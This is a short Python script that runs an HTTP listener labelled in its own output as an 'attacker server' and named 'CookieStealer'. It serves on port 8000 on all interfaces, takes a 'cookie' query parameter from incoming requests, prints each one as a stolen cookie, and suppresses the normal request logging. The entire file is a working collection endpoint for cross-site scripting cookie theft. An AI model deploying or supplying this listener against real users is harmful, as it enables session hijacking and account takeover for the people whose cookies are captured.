from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class CookieStealer(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        if 'cookie' in params:
            print(f"\n[+] Stolen Cookie: {params['cookie'][0]}\n")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        return

if __name__ == "__main__":
    print("[*] Starting attacker server on port 8000...")
    print("[*] Waiting for incoming connections...")
    HTTPServer(('0.0.0.0', 8000), CookieStealer).serve_forever()
